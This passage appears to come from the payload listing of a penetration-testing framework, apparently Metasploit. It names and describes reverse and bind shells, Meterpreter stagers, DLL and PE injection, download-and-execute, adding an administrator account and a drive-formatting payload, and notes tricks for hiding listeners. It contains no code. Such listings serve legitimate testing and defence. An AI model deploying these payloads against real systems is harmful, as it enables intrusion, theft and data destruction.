shell\npython/meterpreter_reverse_tcp                      Connect back to the attacker and spawn a Meterpreter shell\npython/pingback_bind_tcp                            Listens for a connection from the attacker, sends a UUID, then terminates\npython/pingback_reverse_tcp                         Connects back to the attacker, sends a UUID, then terminates\npython/shell_bind_tcp                               Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.4-2.7 and 3.4+.\npython/shell_reverse_tcp                            Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.4-2.7 and 3.4+.\npython/shell_reverse_tcp_ssl                        Creates an interactive shell via Python, uses SSL, encodes with base64 by design. Compatible with Python 2.6-2.7 and 3.4+.\npython/shell_reverse_udp                            Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.6-2.7 and 3.4+.\nr/shell_bind_tcp                                    Continually listen for a connection and spawn a command shell via R\nr/shell_reverse_tcp                                 Connect back and create a command shell via R\nruby/pingback_bind_tcp                              Listens for a connection from the attacker, sends a UUID, then terminates\nruby/pingback_reverse_tcp                           Connect back to the attacker, sends a UUID, then terminates\nruby/shell_bind_tcp                                 Continually listen for a connection and spawn a command shell via Ruby\nruby/shell_bind_tcp_ipv6                            Continually listen for a connection and spawn a command shell via Ruby\nruby/shell_reverse_tcp                              Connect back and create a command shell via Ruby\nruby/shell_reverse_tcp_ssl                          Connect back and create a command shell via Ruby, uses SSL\nsolaris/sparc/shell_bind_tcp                        Listen for a connection and spawn a command shell\nsolaris/sparc/shell_find_port                       Spawn a shell on an established connection\nsolaris/sparc/shell_reverse_tcp                     Connect back to attacker and spawn a command shell\nsolaris/x86/shell_bind_tcp                          Listen for a connection and spawn a command shell\nsolaris/x86/shell_find_port                         Spawn a shell on an established connection\nsolaris/x86/shell_reverse_tcp                       Connect back to attacker and spawn a command shell\ntty/unix/interact                                   Interacts with a TTY on an established socket connection\nwindows/adduser                                     Create a new user and add them to local administration group. Note: The specified password is checked for common complexity requirements to prevent the target machine rejecting the user for failing to meet policy requirements. Complexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit/special)\nwindows/dllinject/bind_hidden_ipknock_tcp           Inject a DLL via a reflective loader. Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method(you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode\nwindows/dllinject/bind_hidden_tcp                   Inject a DLL via a reflective loader. Listen for a connection from a hidden port and spawn a command shell to the allowed host.\nwindows/dllinject/bind_ipv6_tcp                     Inject a DLL via a reflective loader. Listen for an IPv6 connection (Windows x86)\nwindows/dllinject/bind_ipv6_tcp_uuid                Inject a DLL via a reflective loader. Listen for an IPv6 connection with UUID Support (Windows x86)\nwindows/dllinject/bind_named_pipe                   Inject a DLL via a reflective loader. Listen for a pipe connection (Windows x86)\nwindows/dllinject/bind_nonx_tcp                     Inject a DLL via a reflective loader. Listen for a connection (No NX)\nwindows/dllinject/bind_tcp                          Inject a DLL via a reflective loader. Listen for a connection (Windows x86)\nwindows/dllinject/bind_tcp_rc4                      Inject a DLL via a reflective loader. Listen for a connection\nwindows/dllinject/bind_tcp_uuid                     Inject a DLL via a reflective loader. Listen for a connection with UUID Support (Windows x86)\nwindows/dllinject/find_tag                          Inject a DLL via a reflective loader. Use an established connection\nwindows/dllinject/reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as ahop.\nwindows/dllinject/reverse_http                      Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows wininet)\nwindows/dllinject/reverse_http_proxy_pstore         Inject a DLL via a reflective loader. Tunnel communication over HTTP\nwindows/dllinject/reverse_ipv6_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker over IPv6\nwindows/dllinject/reverse_nonx_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker (No NX)\nwindows/dllinject/reverse_ord_tcp                   Inject a DLL via a reflective loader. Connect back to the attacker\nwindows/dllinject/reverse_tcp                       Inject a DLL via a reflective loader. Connect back to the attacker\nwindows/dllinject/reverse_tcp_allports              Inject a DLL via a reflective loader. Try to connect back to the attacker, on all possible ports (1-65535, slowly)\nwindows/dllinject/reverse_tcp_dns                   Inject a DLL via a reflective loader. Connect back to the attacker\nwindows/dllinject/reverse_tcp_rc4                   Inject a DLL via a reflective loader. Connect back to the attacker\nwindows/dllinject/reverse_tcp_rc4_dns               Inject a DLL via a reflective loader. Connect back to the attacker\nwindows/dllinject/reverse_tcp_uuid                  Inject a DLL via a reflective loader. Connect back to the attacker with UUID Support\nwindows/dllinject/reverse_winhttp                   Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows winhttp)\nwindows/dns_txt_query_exec                          Performs a TXT query against a series of DNS record(s) and executes the returned payload\nwindows/download_exec                               Download an EXE from an HTTP(S)/FTP URL and execute it\nwindows/exec                                        Execute an arbitrary command\nwindows/format_all_drives                           This payload formats all mounted disks in Windows (aka ShellcodeOfDeath). After formatting, this payload sets the volume label to the string specified in the VOLUMELABEL option. If the code is unable to access a drive for any reason, it skips the drive and proceeds to the next volume.\nwindows/loadlibrary                                 Load an arbitrary library path\nwindows/messagebox                                  Spawns a dialog via MessageBox using a customizable title, text & icon\nwindows/meterpreter/bind_hidden_ipknock_tcp         Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. Thesocket will appear as "closed," thus helping to hide the shellcode\nwindows/meterpreter/bind_hidden_tcp                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a connection from a hidden port and spawn a command shell to the allowed host.\nwindows/meterpreter/bind_ipv6_tcp                   Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for an IPv6 connection (Windows x86)\nwindows/meterpreter/bind_ipv6_tcp_uuid              Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for an IPv6 connection with UUID Support (Windows x86)\nwindows/meterpreter/bind_named_pipe                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a pipe connection (Windows x86)\nwindows/meterpreter/bind_nonx_tcp                   Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a connection (No NX)\nwindows/meterpreter/bind_tcp                        Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a connection (Windows x86)\nwindows/meterpreter/bind_tcp_rc4                    Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a connection\nwindows/meterpreter/bind_tcp_uuid                   Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a connection with UUID Support (Windows x86)\nwindows/meterpreter/find_tag                        Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Use an established connection\nwindows/meterpreter/reverse_hop_http                Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop.\nwindows/meterpreter/reverse_http                    Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over HTTP (Windows wininet)\nwindows/meterpreter/reverse_http_proxy_pstore       Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over HTTP\nwindows/meterpreter/reverse_https                   Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over HTTPS (Windows wininet)\nwindows/meterpreter/reverse_https_proxy             Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over HTTP using SSL with custom proxy support\nwindows/meterpreter/reverse_ipv6_tcp                Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker over IPv6\nwindows/meterpreter/reverse_named_pipe              Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker via a named pipe pivot\nwindows/meterpreter/reverse_nonx_tcp                Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker (No NX)\nwindows/meterpreter/reverse_ord_tcp                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker\nwindows/meterpreter/reverse_tcp                     Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker\nwindows/meterpreter/reverse_tcp_allports            Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Try to connect back to the attacker, on all possible ports (1-65535, slowly)\nwindows/meterpreter/reverse_tcp_dns                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker\nwindows/meterpreter/reverse_tcp_rc4                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker\nwindows/meterpreter/reverse_tcp_rc4_dns             Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker\nwindows/meterpreter/reverse_tcp_uuid                Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker with UUID Support\nwindows/meterpreter/reverse_winhttp                 Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over HTTP (Windows winhttp)\nwindows/meterpreter/reverse_winhttps                Inject the Meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over HTTPS (Windows winhttp)\nwindows/meterpreter_bind_named_pipe                 Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/meterpreter_bind_tcp                        Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/meterpreter_reverse_ipv6_tcp                Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/meterpreter_reverse_tcp                     Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/metsvc_bind_tcp                             Stub payload for interacting with a Meterpreter Service\nwindows/metsvc_reverse_tcp                          Stub payload for interacting with a Meterpreter Service\nwindows/patchupdllinject/bind_hidden_ipknock_tcp    Inject a custom DLL into the exploited process. Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode\nwindows/patchupdllinject/bind_hidden_tcp            Inject a custom DLL into the exploited process. Listen for a connection from a hidden port and spawn a command shell to the allowed host.\nwindows/patchupdllinject/bind_ipv6_tcp              Inject a custom DLL into the exploited process. Listen for an IPv6 connection (Windows x86)\nwindows/patchupdllinject/bind_ipv6_tcp_uuid         Inject a custom DLL into the exploited process. Listen for an IPv6 connection with UUID Support (Windows x86)\nwindows/patchupdllinject/bind_named_pipe            Inject a custom DLL into the exploited process. Listen for a pipe connection (Windows x86)\nwindows/patchupdllinject/bind_nonx_tcp              Inject a custom DLL into the exploited process. Listen for a connection (No NX)\nwindows/patchupdllinject/bind_tcp                   Inject a custom DLL into the exploited process. Listen for a connection (Windows x86)\nwindows/patchupdllinject/bind_tcp_rc4               Inject a custom DLL into the exploited process. Listen for a connection\nwindows/patchupdllinject/bind_tcp_uuid              Inject a custom DLL into the exploited process. Listen for a connection with UUID Support (Windows x86)\nwindows/patchupdllinject/find_tag                   Inject a custom DLL into the exploited process. Use an established connection\nwindows/patchupdllinject/reverse_ipv6_tcp           Inject a custom DLL into the exploited process. Connect back to the attacker over IPv6\nwindows/patchupdllinject/reverse_nonx_tcp           Inject a custom DLL into the exploited process. Connect back to the attacker (No NX)\nwindows/patchupdllinject/reverse_ord_tcp            Inject a custom DLL into the exploited process. Connect back to the attacker\nwindows/patchupdllinject/reverse_tcp                Inject a custom DLL into the exploited process. Connect back to the attacker\nwindows/patchupdllinject/reverse_tcp_allports       Inject a custom DLL into the exploited process. Try to connect back to the attacker, on all possible ports (1-65535, slowly)\nwindows/patchupdllinject/reverse_tcp_dns            Inject a custom DLL into the exploited process. Connect back to the attacker\nwindows/patchupdllinject/reverse_tcp_rc4            Inject a custom DLL into the exploited process. Connect back to the attacker\nwindows/patchupdllinject/reverse_tcp_rc4_dns        Inject a custom DLL into the exploited process. Connect back to the attacker\nwindows/patchupdllinject/reverse_tcp_uuid           Inject a custom DLL into the exploited process. Connect back to the attacker with UUID Support\nwindows/patchupmeterpreter/bind_hidden_ipknock_tcp  Inject the meterpreter server DLL (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode\nwindows/patchupmeterpreter/bind_hidden_tcp          Inject the meterpreter server DLL (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.\nwindows/patchupmeterpreter/bind_ipv6_tcp            Inject the meterpreter server DLL (staged). Listen for an IPv6 connection (Windows x86)\nwindows/patchupmeterpreter/bind_ipv6_tcp_uuid       Inject the meterpreter server DLL (staged). Listen for an IPv6 connection with UUID Support (Windows x86)\nwindows/patchupmeterpreter/bind_named_pipe          Inject the meterpreter server DLL (staged). Listen for a pipe connection (Windows x86)\nwindows/patchupmeterpreter/bind_nonx_tcp            Inject the meterpreter server DLL (staged). Listen for a connection (No NX)\nwindows/patchupmeterpreter/bind_tcp                 Inject the meterpreter server DLL (staged). Listen for a connection (Windows x86)\nwindows/patchupmeterpreter/bind_tcp_rc4             Inject the meterpreter server DLL (staged). Listen for a connection\nwindows/patchupmeterpreter/bind_tcp_uuid            Inject the meterpreter server DLL (staged). Listen for a connection with UUID Support (Windows x86)\nwindows/patchupmeterpreter/find_tag                 Inject the meterpreter server DLL (staged). Use an established connection\nwindows/patchupmeterpreter/reverse_ipv6_tcp         Inject the meterpreter server DLL (staged). Connect back to the attacker over IPv6\nwindows/patchupmeterpreter/reverse_nonx_tcp         Inject the meterpreter server DLL (staged). Connect back to the attacker (No NX)\nwindows/patchupmeterpreter/reverse_ord_tcp          Inject the meterpreter server DLL (staged). Connect back to the attacker\nwindows/patchupmeterpreter/reverse_tcp              Inject the meterpreter server DLL (staged). Connect back to the attacker\nwindows/patchupmeterpreter/reverse_tcp_allports     Inject the meterpreter server DLL (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)\nwindows/patchupmeterpreter/reverse_tcp_dns          Inject the meterpreter server DLL (staged). Connect back to the attacker\nwindows/patchupmeterpreter/reverse_tcp_rc4          Inject the meterpreter server DLL (staged). Connect back to the attacker\nwindows/patchupmeterpreter/reverse_tcp_rc4_dns      Inject the meterpreter server DLL (staged). Connect back to the attacker\nwindows/patchupmeterpreter/reverse_tcp_uuid         Inject the meterpreter server DLL (staged). Connect back to the attacker with UUID Support\nwindows/peinject/bind_hidden_ipknock_tcp            Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Listen for a connection.First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you couldget your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode\nwindows/peinject/bind_hidden_tcp                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Listen for a connectionfrom a hidden port and spawn a command shell to the allowed host.\nwindows/peinject/bind_ipv6_tcp                      Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Listen for an IPv6 connection (Windows x86)\nwindows/peinject/bind_ipv6_tcp_uuid                 Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Listen for an IPv6 connection with UUID Support (Windows x86)\nwindows/peinject/bind_named_pipe                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Listen for a pipe connection (Windows x86)\nwindows/peinject/bind_nonx_tcp                      Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Listen for a connection(No NX)\nwindows/peinject/bind_tcp                           Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Listen for a connection(Windows x86)\nwindows/peinject/bind_tcp_rc4                       Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Listen for a connection\nwindows/peinject/bind_tcp_uuid                      Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Listen for a connectionwith UUID Support (Windows x86)\nwindows/peinject/find_tag                           Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Use an established connection\nwindows/peinject/reverse_ipv6_tcp                   Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Connect back to the attacker over IPv6\nwindows/peinject/reverse_named_pipe                 Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Connect back to the attacker via a named pipe pivot\nwindows/peinject/reverse_nonx_tcp                   Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Connect back to the attacker (No NX)\nwindows/peinject/reverse_ord_tcp                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Connect back to the attacker\nwindows/peinject/reverse_tcp                        Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Connect back to the attacker\nwindows/peinject/reverse_tcp_allports               Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Try to connect back to the attacker, on all possible ports (1-65535, slowly)\nwindows/peinject/reverse_tcp_dns                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Connect back to the attacker\nwindows/peinject/reverse_tcp_rc4                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Connect back to the attacker\nwindows/peinject/reverse_tcp_rc4_dns                Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Connect back to the attacker\nwindows/peinject/reverse_tcp_uuid                   Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Connect back to the attacker with UUID Support\nwindows/pingback_bind_tcp                           Open a socket and report UUID when a connection is received (Windows x86)\nwindows/pingback_reverse_tcp                        Connect back to attacker and report UUID (Windows x86)\nwindows/powershell_bind_tcp                         Listen for a connection and spawn an interactive powershell session\nwindows/powershell_reverse_tcp                      Listen for a connection and spawn an interactive powershell session\nwindows/shell/bind_hidden_ipknock_tcp               Spawn a piped command shell (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method(you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode\nwindows/shell/bind_hidden_tcp                       Spawn a piped command shell (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.\nwindows/shell/bind_ipv6_tcp                         Spawn a piped command shell (staged). Listen for an IPv6 connection (Windows x86)\nwindows/shell/bind_ipv6_tcp_uuid                    Spawn a piped command shell (staged). Listen for an IPv6 connection with UUID Support (Windows x86)\nwindows/shell/bind_named_pipe                       Spawn a piped command shell (staged). Listen for a pipe connection (Windows x86)\nwindows/shell/bind_nonx_tcp                         Spawn a piped command shell (staged). Listen for a connection (No NX)\nwindows/shell/bind_tcp                              Spawn a piped command shell (staged). Listen for a connection (Windows x86)\nwindows/shell/bind_tcp_rc4                          Spawn a piped command shell (staged). Listen for a connection\nwindows/shell/bind_tcp_uuid                         Spawn a piped command shell (staged). Listen for a connection with UUID Support (Windows x86)\nwindows/shell/find_tag                              Spawn a piped command shell (staged). Use an established connection\nwindows/shell/reverse_ipv6_tcp                      Spawn a piped command shell (staged). Connect back to the attacker over IPv6\nwindows/shell/reverse_nonx_tcp                      Spawn a piped command shell (staged). Connect back to the attacker (No NX)\nwindows/shell/reverse_ord_tcp                       Spawn a piped command shell (staged). Connect back to the attacker\nwindows/shell/reverse_tcp                           Spawn a piped command shell (staged). Connect back to the attacker\nwindows/shell/reverse_tcp_allports                  Spawn a piped command shell (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)\nwindows/shell/reverse_tcp_dns                       Spawn a piped command shell (staged). Connect back to the attacker\nwindows/shell/reverse_tcp_rc4                       Spawn a piped command shell (staged). Connect back to the attacker\nwindows/shell/reverse_tcp_rc4_dns                   Spawn a piped command shell (staged). Connect back to the attacker\nwindows/shell/reverse_tcp_uuid                      Spawn a piped command shell (staged). Connect back to the attacker with UUID Support\nwindows/shell/reverse_udp                           Spawn a piped command shell (staged). Connect back to the attacker with UUID Support\nwindows/shell_bind_tcp                              Listen for a connection and spawn a command shell\nwindows/shell_bind_tcp_xpfw                         Disable the Windows ICF, then listen for a connection and spawn a command shell\nwindows/shell_hidden_bind_tcp                       Listen for a connection from certain IP and spawn a command shell. The shellcode will reply with a RST packet if the connections is not coming from the IP defined in AHOST. This way the port will appear as "closed" helping us to hide the shellcode.\nwindows/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\nwindows/speak_pwned                                 Causes the target to say "You Got Pwned" via the Windows Speech API\nwindows/upexec/bind_hidden_ipknock_tcp              Uploads an executable and runs it (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode\nwindows/upexec/bind_hidden_tcp                      Uploads an executable and runs it (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.\nwindows/upexec/bind_ipv6_tcp                        Uploads an executable and runs it (staged). Listen for an IPv6 connection (Windows x86)\nwindows/upexec/bind_ipv6_tcp_uuid                   Uploads an executable and runs it (staged). Listen for an IPv6 connection with UUID Support (Windows x86)\nwindows/upexec/bind_named_pipe                      Uploads an executable and runs it (staged). Listen for a pipe connection (Windows x86)\nwindows/upexec/bind_nonx_tcp                        Uploads an executable and runs it (staged). Listen for a connection (No NX)\nwindows/upexec/bind_tcp                             Uploads an executable and runs it (staged). Listen for a connection (Windows x86)\nwindows/upexec/bind_tcp_rc4                         Uploads an executable and runs it (staged). Listen for a connection\nwindows/upexec/bind_tcp_uuid                        Uploads an executable and runs it (staged). Listen for a connection with UUID Support (Windows x86)\nwindows/upexec/find_tag                             Uploads an executable and runs it (staged). Use an established connection\nwindows/upexec/reverse_ipv6_tcp                     Uploads an executable and runs it (staged). Connect back to the attacker over IPv6\nwindows/upexec/reverse_nonx_tcp                     Uploads an executable and runs it (staged). Connect back to the attacker (No NX)\nwindows/upexec/reverse_ord_tcp                      Uploads an executable and runs it (staged). Connect back to the attacker\nwindows/upexec/reverse_tcp                          Uploads an executable and runs it (staged). Connect back to the attacker\nwindows/upexec/reverse_tcp_allports                 Uploads an executable and runs it (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)\nwindows/upexec/reverse_tcp_dns                      Uploads an executable and runs it (staged). Connect back to the attacker\nwindows/upexec/reverse_tcp_rc4                      Uploads an executable and runs it (staged). Connect back to the attacker\nwindows/upexec/reverse_tcp_rc4_dns                  Uploads an executable and runs it (staged). Connect back to the attacker\nwindows/upexec/reverse_tcp_uuid                     Uploads an executable and runs it (staged). Connect back to the attacker with UUID Support\nwindows/upexec/reverse_udp                          Uploads an executable and runs it (staged). Connect back to the attacker with UUID Support\nwindows/vncinject/bind_hidden_ipknock_tcp           Inject a VNC Dll via a reflective loader (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode\nwindows/vncinject/bind_hidden_tcp                   Inject a VNC Dll via a reflective loader (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.\nwindows/vncinject/bind_ipv6_tcp                     Inject a VNC Dll via a reflective loader (staged). Listen for an IPv6 connection (Windows x86)\nwindows/vncinject/bind_ipv6_tcp_uuid                Inject a VNC Dll via a reflective loader (staged). Listen for an IPv6 connection with UUID Support (Windows x86)\nwindows/vncinject/bind_named_pipe                   Inject a VNC Dll via a reflective loader (staged). Listen for a pipe connection (Windows x86)\nwindows/vncinject/bind_nonx_tcp                     Inject a VNC Dll via a reflective loader (staged). Listen for a connection (No NX)\nwindows/vncinject/bind_tcp                          Inject a VNC Dll via a reflective loader (staged). Listen for a connection (Windows x86)\nwindows/vncinject/bind_tcp_rc4                      Inject a VNC Dll via a reflective loader (staged). Listen for a connection\nwindows/vncinject/bind_tcp_uuid                     Inject a VNC 